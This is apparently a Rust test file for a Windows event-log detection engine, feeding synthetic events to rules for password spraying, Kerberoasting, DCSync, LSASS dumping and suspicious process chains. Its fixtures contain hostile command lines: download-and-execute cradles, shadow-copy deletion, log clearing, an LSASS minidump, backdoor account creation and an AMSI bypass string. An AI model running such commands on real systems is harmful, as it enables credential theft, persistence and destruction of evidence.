use super::*;

fn ev(id: u32, channel: &str, provider: &str, data: &[(&str, &str)]) -> Event {
    Event {
        record_id: 1,
        time: "2026-11-09T10:00:00.000000Z".into(),
        event_id: id,
        provider: provider.into(),
        channel: channel.into(),
        computer: "WS01.corp.example".into(),
        data: data.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
        ..Default::default()
    }
}

fn sec(id: u32, data: &[(&str, &str)]) -> Event {
    ev(id, "Security", "Microsoft-Windows-Security-Auditing", data)
}

fn sysmon(id: u32, data: &[(&str, &str)]) -> Event {
    ev(id, "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", data)
}

fn run(events: &[Event]) -> Report {
    let mut s = State::default();
    for e in events {
        s.event(e);
    }
    s.finish(&evtx::Summary { chunks: 1, records: events.len() as u64, ..Default::default() })
}

fn rule<'a>(r: &'a Report, id: &str) -> Option<&'a Detection> {
    r.detections.iter().find(|d| d.rule == id)
}

#[test]
fn logon_failures_become_guessing_spraying_and_a_suspicious_success() {
    let mut events = Vec::new();
    for _ in 0..12 {
        events.push(sec(4625, &[("TargetUserName", "admin"), ("TargetDomainName", "CORP"), ("IpAddress", "203.0.113.5"), ("LogonType", "3")]));
    }
    for user in ["a", "b", "c", "d", "e", "f"] {
        events.push(sec(4625, &[("TargetUserName", user), ("IpAddress", "198.51.100.9"), ("LogonType", "3")]));
    }
    events.push(sec(4624, &[("TargetUserName", "admin"), ("TargetDomainName", "CORP"), ("IpAddress", "203.0.113.5"), ("LogonType", "3")]));
    events.push(sec(4624, &[("TargetUserName", "WS02$"), ("IpAddress", "203.0.113.5"), ("LogonType", "3")]));
    events.push(sec(4624, &[("TargetUserName", "helpdesk"), ("IpAddress", "192.0.2.4"), ("LogonType", "10")]));
    let r = run(&events);
    let guessing = rule(&r, "EVT-PASSWORD-GUESSING").unwrap();
    assert_eq!((guessing.count, guessing.severity.as_str(), guessing.sources[0].ip.as_str()), (12, "medium", "203.0.113.5 (1 accounts)"));
    let spraying = rule(&r, "EVT-PASSWORD-SPRAYING").unwrap();
    assert_eq!((spraying.severity.as_str(), spraying.technique.as_str()), ("high", "T1110.003 Brute Force: Password Spraying"));
    let after = rule(&r, "EVT-LOGON-AFTER-FAILURES").unwrap();
    assert_eq!(after.count, 1, "the computer account's logon does not count");
    assert!(after.sources[0].examples[0].contains("CORP\\admin logged on (type 3) after 12 failures"), "{:?}", after.sources[0].examples);
    assert_eq!(rule(&r, "EVT-RDP-LOGON").unwrap().sources[0].ip, "helpdesk from 192.0.2.4");
    assert_eq!(r.detections[0].severity, "high", "the most severe first");
    assert_eq!((r.kind.as_str(), r.recognised, r.computers.clone()), ("windows", 21, vec!["WS01.corp.example".to_string()]));
    assert_eq!((r.events[0].id, r.events[0].name.as_str(), r.events[0].count), (4625, "Failed logon", 18));
}

#[test]
fn commands_services_and_tasks() {
    let events = vec![
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"), ("CommandLine", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"), ("SubjectUserName", "bob"), ("SubjectDomainName", "CORP")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\certutil.exe"), ("CommandLine", "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe C:\\Users\\Public\\a.exe")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\vssadmin.exe"), ("CommandLine", "vssadmin.exe delete shadows /all /quiet")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\wevtutil.exe"), ("CommandLine", "wevtutil cl Security")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\net.exe"), ("CommandLine", "net user backdoor S3cret! /add")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\cmd.exe"), ("CommandLine", "cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1 2>&1"), ("ParentProcessName", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe")]),
        sysmon(1, &[("Image", "C:\\Windows\\System32\\rundll32.exe"), ("CommandLine", "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\ProgramData\\lsass.dmp full"), ("User", "CORP\\bob")]),
        sysmon(1, &[("Image", "C:\\Windows\\System32\\mshta.exe"), ("CommandLine", "mshta.exe https://203.0.113.9/x.hta")]),
        ev(7045, "System", "Service Control Manager", &[("ServiceName", "WinPwnage"), ("ImagePath", "%COMSPEC% /c ping -n 1 127.0.0.1 >nul && echo 'WinPwnage' > \\\\.\\pipe\\WinPwnagePipe")]),
        ev(7045, "System", "Service Control Manager", &[("ServiceName", "Google Update"), ("ImagePath", "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /svc")]),
        // a hardware monitor extracts its driver to Temp: worth a look, not a command line
        ev(7045, "System", "Service Control Manager", &[("ServiceName", "HWiNFO Kernel Driver"), ("ImagePath", "C:\\WINDOWS\\TEMP\\HWiNFO_x64_214.sys")]),
        sec(4698, &[("TaskName", "\\CYAlyNSS"), ("SubjectUserName", "Administrator"), ("TaskContent", "<Task><Actions><Exec><Command>cmd.exe</Command><Arguments>/C whoami &gt; %windir%\\Temp\\CYAlyNSS.tmp 2&gt;&amp;1</Arguments></Exec></Actions></Task>")]),
    ];
    let r = run(&events);
    for (id, technique) in [
        ("EVT-ENCODED-POWERSHELL", "T1027"),
        ("EVT-DOWNLOAD-COMMAND", "T1105"),
        ("EVT-RECOVERY-INHIBITED", "T1490"),
        ("EVT-LOG-CLEAR-COMMAND", "T1070.001"),
        ("EVT-ACCOUNT-COMMAND", "T1098"),
        ("EVT-WMI-PROCESS", "T1047"),
        ("EVT-CREDENTIAL-DUMP", "T1003"),
        ("EVT-PROXY-EXECUTION", "T1218"),
        ("EVT-SERVICE-COMMAND", "T1569.002"),
        ("EVT-SERVICE-INSTALLED", "T1543.003"),
        ("EVT-TASK-COMMAND", "T1053.005"),
    ] {
        let d = rule(&r, id).unwrap_or_else(|| panic!("{id} in {:?}", r.detections.iter().map(|d| d.rule.clone()).collect::<Vec<_>>()));
        assert!(d.technique.starts_with(technique), "{id}: {}", d.technique);
    }
    assert_eq!(rule(&r, "EVT-SERVICE-INSTALLED").unwrap().sources[0].ip, "Google Update", "an ordinary service is listed at low severity only");
    // a 4688 without ParentProcessName (Windows before 10): the parent comes from the creator's process ID
    let old = run(&[
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"), ("NewProcessId", "0x0000000000000ae8"), ("ProcessId", "0x248")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\calc.exe"), ("NewProcessId", "0x424"), ("ProcessId", "0x0000000000000ae8")]),
    ]);
    assert_eq!(rule(&old, "EVT-WMI-PROCESS").map(|d| d.count), Some(1));
    assert_eq!(rule(&r, "EVT-SERVICE-COMMAND").unwrap().count, 1);
    let writable = rule(&r, "EVT-SERVICE-WRITABLE-FOLDER").unwrap();
    assert_eq!((writable.severity.as_str(), writable.sources[0].ip.as_str()), ("medium", "HWiNFO Kernel Driver"));
    assert_eq!(rule(&r, "EVT-ENCODED-POWERSHELL").unwrap().sources[0].ip, "CORP\\bob");
}

#[test]
fn accounts_groups_kerberos_and_directory_replication() {
    let mut events = vec![
        sec(4720, &[("TargetUserName", "$"), ("TargetDomainName", "CORP"), ("SubjectUserName", "WS9$")]),
        sec(4720, &[("TargetUserName", "jdoe"), ("SubjectUserName", "admin")]),
        sec(4732, &[("TargetUserName", "Administrators"), ("TargetSid", "S-1-5-32-544"), ("MemberSid", "S-1-5-20"), ("MemberName", "-"), ("SubjectUserName", "IEUser")]),
        sec(4728, &[("TargetUserName", "Domain Admins"), ("TargetSid", "S-1-5-21-1-2-3-512"), ("MemberName", "CN=eve")]),
        sec(4732, &[("TargetUserName", "Print Helpers"), ("TargetSid", "S-1-5-21-1-2-3-1104"), ("MemberName", "CN=eve")]),
        sec(4662, &[("SubjectUserName", "Administrator"), ("Properties", "%%7688\r\n\t\t{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}")]),
        sec(4662, &[("SubjectUserName", "DC02$"), ("Properties", "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}")]),
        sec(4768, &[("TargetUserName", "svc_legacy"), ("PreAuthType", "0"), ("IpAddress", "::ffff:10.0.0.7")]),
        sec(4648, &[("ProcessName", "C:\\Windows\\System32\\inetsrv\\w3wp.exe"), ("SubjectUserName", "svc01"), ("TargetUserName", "IEUser"), ("TargetServerName", "localhost")]),
        sec(4648, &[("ProcessName", "C:\\Windows\\System32\\svchost.exe"), ("SubjectUserName", "bob"), ("TargetUserName", "admin"), ("TargetServerName", "FS01.corp.example")]),
        sec(1102, &[("SubjectUserName", "user01")]),
        ev(1102, "Security", "Microsoft-Windows-Eventlog", &[("SubjectUserName", "user01"), ("SubjectDomainName", "CORP")]),
        ev(1116, "Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender", &[("Threat Name", "Trojan:PowerShell/Powersploit.M"), ("Path", "file:_C:\\x.ps1")]),
        sysmon(10, &[("SourceImage", "C:\\Users\\IEUser\\mimikatz.exe"), ("TargetImage", "C:\\Windows\\system32\\lsass.exe"), ("GrantedAccess", "0x00001010")]),
        sysmon(10, &[("SourceImage", "C:\\Windows\\System32\\svchost.exe"), ("TargetImage", "C:\\Windows\\system32\\lsass.exe"), ("GrantedAccess", "0x1fffff")]),
        sysmon(13, &[("TargetObject", "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater"), ("Details", "C:\\Users\\Public\\u.exe"), ("Image", "C:\\Users\\Public\\dropper.exe")]),
        sysmon(13, &[("TargetObject", "HKLM\\System\\CurrentControlSet\\services\\xvq\\ImagePath"), ("Details", "%COMSPEC% /b /c start /b /min powershell.exe -nop"), ("Image", "C:\\Windows\\system32\\services.exe")]),
    ];
    for service in ["MSSQLSvc/db1", "HTTP/web1", "CIFS/fs1", "MSSQLSvc/db2", "HTTP/web2"] {
        events.push(sec(4769, &[("TargetUserName", "eve@CORP.EXAMPLE"), ("ServiceName", service), ("TicketEncryptionType", "0x17"), ("IpAddress", "10.0.0.66")]));
    }
    events.push(sec(4769, &[("TargetUserName", "WS01$@CORP.EXAMPLE"), ("ServiceName", "WS01$"), ("TicketEncryptionType", "0x17")]));
    events.push(sec(4769, &[("TargetUserName", "bob@CORP.EXAMPLE"), ("ServiceName", "HTTP/web1"), ("TicketEncryptionType", "0x12")]));
    let r = run(&events);
    let ids: Vec<&str> = r.detections.iter().map(|d| d.rule.as_str()).collect();
    for id in ["EVT-ACCOUNT-LIKE-COMPUTER", "EVT-ACCOUNT-CREATED", "EVT-PRIVILEGED-GROUP", "EVT-DCSYNC", "EVT-ASREP-ROASTING", "EVT-SERVER-PROCESS-CREDENTIALS", "EVT-EXPLICIT-CREDENTIALS", "EVT-LOG-CLEARED", "EVT-DEFENDER-DETECTION", "EVT-LSASS-ACCESS", "EVT-RUN-KEY", "EVT-SERVICE-REGISTRY", "EVT-KERBEROASTING"] {
        assert!(ids.contains(&id), "{id} in {ids:?}");
    }
    assert_eq!(rule(&r, "EVT-PRIVILEGED-GROUP").unwrap().count, 2, "Print Helpers is not privileged");
    assert_eq!(rule(&r, "EVT-DCSYNC").unwrap().count, 1, "domain controllers replicate");
    assert_eq!(rule(&r, "EVT-LSASS-ACCESS").unwrap().count, 1, "svchost is expected to open lsass");
    let kerb = rule(&r, "EVT-KERBEROASTING").unwrap();
    assert_eq!((kerb.severity.as_str(), kerb.sources[0].ip.as_str()), ("high", "eve@CORP.EXAMPLE (5 services)"));
    assert_eq!(rule(&r, "EVT-LOG-CLEARED").unwrap().count, 1, "1102 counts only from the Eventlog provider that writes it");
}

#[test]
fn scripts_and_obfuscation() {
    let r = run(&[
        ev(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", &[("ScriptBlockText", "$p = Get-Process lsass\n[MiniDump]::MiniDumpWriteDump($p.Handle)"), ("Path", "C:\\Users\\Public\\lsass_wer_ps.ps1")]),
        ev(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", &[("ScriptBlockText", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"), ("Path", "")]),
        ev(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", &[("ScriptBlockText", "$a=(('Q'+'2h')+('w9p'+'1'));&('ne'+'w-'+'item') x;('Sy'+'st'+'em')"), ("Path", "")]),
        ev(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", &[("ScriptBlockText", "Get-ChildItem C:\\"), ("Path", "")]),
    ]);
    assert_eq!(rule(&r, "EVT-CREDENTIAL-DUMP").unwrap().sources[0].ip, "C:\\Users\\Public\\lsass_wer_ps.ps1");
    assert_eq!(rule(&r, "EVT-SUSPICIOUS-SCRIPT").unwrap().count, 1);
    assert_eq!(rule(&r, "EVT-OBFUSCATED-SCRIPT").unwrap().count, 1);
    assert_eq!(r.detections.len(), 3, "an ordinary script block is not reported");
}

#[test]
fn examples_are_redacted_and_bounded() {
    let r = run(&[sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\cmd.exe"), ("CommandLine", &format!("cmd /c certutil -urlcache -f http://x.example/a password=Hunter2Secret {}", "A".repeat(2000)))])]);
    let ex = &rule(&r, "EVT-DOWNLOAD-COMMAND").unwrap().sources[0].examples[0];
    assert!(!ex.contains("Hunter2Secret"), "{ex}");
    assert!(ex.chars().count() <= 401);
}

/// The EVTX-ATTACK-SAMPLES files used to verify the rules (`CYBERHUB_EVTX_DIR`, see the
/// implementation log); not part of the repository.
#[test]
#[ignore]
fn attack_samples_raise_the_expected_detections() {
    let dir = std::path::PathBuf::from(std::env::var("CYBERHUB_EVTX_DIR").expect("CYBERHUB_EVTX_DIR"));
    let expected = [
        ("DE_1102_security_log_cleared.evtx", "EVT-LOG-CLEARED"),
        ("DE_104_system_log_cleared.evtx", "EVT-LOG-CLEARED"),
        ("CA_DCSync_4662.evtx", "EVT-DCSYNC"),
        ("sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx", "EVT-LSASS-ACCESS"),
        ("Powershell_4104_MiniDumpWriteDump_Lsass.evtx", "EVT-CREDENTIAL-DUMP"),
        ("exec_emotet_ps_4104.evtx", "EVT-SUSPICIOUS-SCRIPT"),
        ("temp_scheduled_task_4698_4699.evtx", "EVT-TASK-COMMAND"),
        ("LM_Remote_Service02_7045.evtx", "EVT-SERVICE-COMMAND"),
        ("System_7045_namedpipe_privesc.evtx", "EVT-SERVICE-COMMAND"),
        ("Network_Service_Guest_added_to_admins_4732.evtx", "EVT-PRIVILEGED-GROUP"),
        ("DE_Fake_ComputerAccount_4720.evtx", "EVT-ACCOUNT-LIKE-COMPUTER"),
        ("WinDefender_Events_1117_1116_AtomicRedTeam.evtx", "EVT-DEFENDER-DETECTION"),
        ("Runas_4624_4648_Webshell_CreateProcessAsUserA.evtx", "EVT-SERVER-PROCESS-CREDENTIALS"),
        ("LM_WMI_4624_4688_TargetHost.evtx", "EVT-WMI-PROCESS"),
        ("sysmon_10_1_memdump_comsvcs_minidump.evtx", "EVT-CREDENTIAL-DUMP"),
        ("LM_sysmon_psexec_smb_meterpreter.evtx", "EVT-SERVICE-REGISTRY"),
    ];
    let mut missed = Vec::new();
    for (file, id) in expected {
        let r = analyze(std::fs::File::open(dir.join(file)).unwrap()).unwrap();
        let got: Vec<String> = r.detections.iter().map(|d| format!("{} ({})", d.rule, d.count)).collect();
        eprintln!("{file}: {}", got.join(", "));
        if !r.detections.iter().any(|d| d.rule == id) {
            missed.push(format!("{file}: {id}"));
        }
    }
    let quiet = analyze(std::fs::File::open(dir.join("CA_4624_4625_LogonType2_LogonProc_chrome.evtx")).unwrap()).unwrap();
    eprintln!("CA_4624_4625_LogonType2_LogonProc_chrome.evtx: {:?}", quiet.detections.iter().map(|d| d.rule.clone()).collect::<Vec<_>>());
    assert!(missed.is_empty(), "missed: {missed:?}");
}

fn at(mut e: Event, record: u64, time: &str) -> Event {
    e.record_id = record;
    e.time = time.into();
    e
}

/// Mission 6: Office → cmd → powershell, from Sysmon 1, linked by GUIDs; the chain keeps what the
/// log says, why it was flagged and what it may mean apart.
#[test]
fn process_chains_link_sysmon_processes_and_flag_unusual_parents() {
    let events = vec![
        at(sysmon(1, &[("ProcessGuid", "{A1}"), ("ParentProcessGuid", "{A0}"), ("ProcessId", "4100"), ("Image", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"), ("CommandLine", r#""WINWORD.EXE" /n "C:\Users\ann\Downloads\invoice.docm""#), ("ParentImage", r"C:\Windows\explorer.exe"), ("User", r"CORP\ann")]), 10, "2026-11-09T10:00:00Z"),
        at(sysmon(1, &[("ProcessGuid", "{A2}"), ("ParentProcessGuid", "{A1}"), ("ProcessId", "4200"), ("Image", r"C:\Windows\System32\cmd.exe"), ("CommandLine", "cmd.exe /c powershell -nop -w hidden -c iex(iwr http://198.51.100.7/a)"), ("ParentImage", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"), ("User", r"CORP\ann")]), 11, "2026-11-09T10:00:05Z"),
        at(sysmon(1, &[("ProcessGuid", "{A3}"), ("ParentProcessGuid", "{A2}"), ("ProcessId", "4300"), ("Image", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"), ("CommandLine", "powershell -nop -w hidden -c iex(iwr http://198.51.100.7/a)"), ("ParentImage", r"C:\Windows\System32\cmd.exe"), ("User", r"CORP\ann")]), 12, "2026-11-09T10:00:06Z"),
        // an ordinary shell from Explorer is not flagged
        at(sysmon(1, &[("ProcessGuid", "{B1}"), ("ParentProcessGuid", "{A0}"), ("ProcessId", "5000"), ("Image", r"C:\Windows\System32\cmd.exe"), ("CommandLine", "cmd.exe"), ("ParentImage", r"C:\Windows\explorer.exe"), ("User", r"CORP\ann")]), 13, "2026-11-09T10:01:00Z"),
    ];
    let r = run(&events);
    assert_eq!(r.chains.len(), 1, "{:?}", r.chains);
    let c = &r.chains[0];
    assert_eq!((c.pattern.as_str(), c.technique.as_str(), c.computer.as_str()), ("CHAIN-OFFICE-SHELL", "T1204.002 User Execution: Malicious File", "WS01.corp.example"));
    let roles: Vec<(&str, i32, u64)> = c.processes.iter().map(|p| (p.role.as_str(), p.depth, p.record)).collect();
    // Explorer is known only by name (it started before the log); Word, then cmd, then what cmd started
    assert_eq!(roles, [("ancestor", -2, 0), ("ancestor", -1, 10), ("flagged", 0, 11), ("descendant", 1, 12)]);
    assert!(c.processes[1].command_line.contains("invoice.docm"));
    assert!(c.why.contains("macro") && c.hypotheses.contains("Rule out"), "the derived signal and the hypotheses are separate texts");
    // the single-event detections still run alongside
    assert!(rule(&r, "EVT-DOWNLOAD-COMMAND").is_some());
}

#[test]
fn process_chains_from_4688_use_process_ids_and_parents_known_only_by_name() {
    let events = vec![
        // IIS worker started before the log: only its name is in the child's event
        at(sec(4688, &[("NewProcessId", "0x1a4"), ("ProcessId", "0x9c"), ("NewProcessName", r"C:\Windows\System32\cmd.exe"), ("CommandLine", r#"cmd.exe /c "whoami""#), ("ParentProcessName", r"C:\Windows\System32\inetsrv\w3wp.exe"), ("SubjectUserName", "IIS APPPOOL"), ("SubjectDomainName", "CORP")]), 20, "2026-11-09T11:00:00Z"),
        at(sec(4688, &[("NewProcessId", "0x1b0"), ("ProcessId", "0x1a4"), ("NewProcessName", r"C:\Windows\System32\whoami.exe"), ("CommandLine", "whoami"), ("ParentProcessName", r"C:\Windows\System32\cmd.exe"), ("SubjectUserName", "IIS APPPOOL"), ("SubjectDomainName", "CORP")]), 21, "2026-11-09T11:00:01Z"),
        // a service-started shell
        at(sec(4688, &[("NewProcessId", "0x200"), ("ProcessId", "0x2a0"), ("NewProcessName", r"C:\Windows\System32\cmd.exe"), ("CommandLine", r"cmd.exe /Q /c echo whoami ^> \127.0.0.1\C$\__output"), ("ParentProcessName", r"C:\Windows\System32\services.exe"), ("SubjectUserName", "WS01$"), ("SubjectDomainName", "CORP")]), 22, "2026-11-09T11:05:00Z"),
    ];
    let r = run(&events);
    let ids: Vec<&str> = r.chains.iter().map(|c| c.pattern.as_str()).collect();
    assert_eq!(ids, ["CHAIN-WEB-SERVER-SHELL", "CHAIN-SERVICE-SHELL"], "high first");
    let web = &r.chains[0];
    assert_eq!(web.technique, "T1505.003 Server Software Component: Web Shell");
    let rows: Vec<(&str, &str, &str)> = web.processes.iter().map(|p| (p.role.as_str(), p.pid.as_str(), p.image.rsplit('\\').next().unwrap())).collect();
    assert_eq!(rows, [("ancestor", "", "w3wp.exe"), ("flagged", "420", "cmd.exe"), ("descendant", "432", "whoami.exe")]);
    // no technique is claimed where the relationship does not show one
    let lsass = run(&[at(sec(4688, &[("NewProcessId", "0x300"), ("ProcessId", "0x2c0"), ("NewProcessName", r"C:\Users\Public\x.exe"), ("ParentProcessName", r"C:\Windows\System32\lsass.exe")]), 30, "2026-11-09T12:00:00Z")]);
    assert_eq!((lsass.chains[0].pattern.as_str(), lsass.chains[0].technique.as_str()), ("CHAIN-LSASS-CHILD", ""));
}

#[test]
fn process_chains_are_bounded_and_logons_are_summarized_per_account() {
    let mut events = Vec::new();
    for i in 0..120u64 {
        events.push(at(sysmon(1, &[("ProcessGuid", &format!("{{C{i}}}")), ("ParentProcessGuid", "{W}"), ("ProcessId", &i.to_string()), ("Image", r"C:\Windows\System32\cmd.exe"), ("CommandLine", "cmd /c whoami"), ("ParentImage", r"C:\Windows\System32\inetsrv\w3wp.exe")]), i + 1, "2026-11-09T10:00:00Z"));
    }
    let r = run(&events);
    assert_eq!(r.chains.len(), 50, "50 per pattern");
    assert!(r.warnings.iter().any(|w| w.contains("70 more flagged process relationships")), "{:?}", r.warnings);

    let mut logons = Vec::new();
    for (i, (user, ip, ty)) in [("ann", "10.0.0.5", "3"), ("ann", "10.0.0.5", "3"), ("ann", "198.51.100.9", "10"), ("WS01$", "10.0.0.9", "3"), ("SYSTEM", "", "5")].iter().enumerate() {
        logons.push(at(sec(4624, &[("TargetUserName", user), ("TargetDomainName", "CORP"), ("IpAddress", ip), ("LogonType", ty)]), i as u64 + 1, &format!("2026-11-09T10:0{i}:00Z")));
    }
    logons.push(at(sec(4625, &[("TargetUserName", "ann"), ("TargetDomainName", "CORP"), ("IpAddress", "203.0.113.5"), ("LogonType", "3")]), 9, "2026-11-09T09:00:00Z"));
    let r = run(&logons);
    assert_eq!(r.logons.len(), 1, "machine and system identities are left out: {:?}", r.logons);
    let ann = &r.logons[0];
    assert_eq!((ann.account.as_str(), ann.logons, ann.failures), (r"CORP\ann", 3, 1));
    assert_eq!(ann.types, [("10".to_string(), 1), ("3".to_string(), 2)]);
    assert_eq!(ann.sources[0], ("10.0.0.5".to_string(), 2));
    assert_eq!((ann.first.as_str(), ann.last.as_str()), ("2026-11-09T09:00:00Z", "2026-11-09T10:02:00Z"));
    assert!(r.warnings.iter().all(|w| !w.contains("Logons per account")), "nothing was cut: {:?}", r.warnings);

    // more than 100 accounts: the busiest 100 are listed, and the report says so
    let many: Vec<_> = (0..130u64).map(|i| at(sec(4624, &[("TargetUserName", &format!("user{i}")), ("TargetDomainName", "CORP"), ("IpAddress", "10.0.0.5"), ("LogonType", "3")]), i + 1, "2026-11-09T10:00:00Z")).collect();
    let r = run(&many);
    assert_eq!(r.logons.len(), 100);
    assert!(r.warnings.iter().any(|w| w.contains("the 100 busiest of 130 accounts")), "{:?}", r.warnings);
}

/// Mission 6: process chains on the public EVTX-ATTACK-SAMPLES files (set CYBERHUB_EVTX_DIR).
#[test]
#[ignore]
fn attack_samples_process_chains() {
    let dir = std::path::PathBuf::from(std::env::var("CYBERHUB_EVTX_DIR").expect("CYBERHUB_EVTX_DIR"));
    let mut names: Vec<_> = std::fs::read_dir(&dir).unwrap().flatten().map(|e| e.path()).filter(|p| p.extension().is_some_and(|x| x == "evtx")).collect();
    names.sort();
    for p in names {
        let r = analyze(std::fs::File::open(&p).unwrap()).unwrap();
        let chains: Vec<String> = r.chains.iter().map(|c| format!("{} [{}]", c.pattern, c.processes.iter().map(|x| format!("{}:{}", x.role.chars().next().unwrap(), x.image.rsplit(['\\', '/']).next().unwrap_or(""))).collect::<Vec<_>>().join(" > "))).collect();
        let name = p.file_name().unwrap().to_string_lossy().to_string();
        println!("CHAINS {name} -> {} chains, {} accounts: {}", r.chains.len(), r.logons.len(), chains.join(" | "));
        // the two samples whose processes form a flagged relationship
        match name.as_str() {
            "LM_sysmon_psexec_smb_meterpreter.evtx" => assert_eq!(chains, ["CHAIN-SERVICE-SHELL [a:services.exe > f:cmd.exe > d:powershell.exe > d:powershell.exe]"]),
            "sysmon_10_1_memdump_comsvcs_minidump.evtx" => assert_eq!(chains, ["CHAIN-WMI-SHELL [a:WmiPrvSE.exe > f:rundll32.exe]"]),
            _ => {}
        }
    }
}
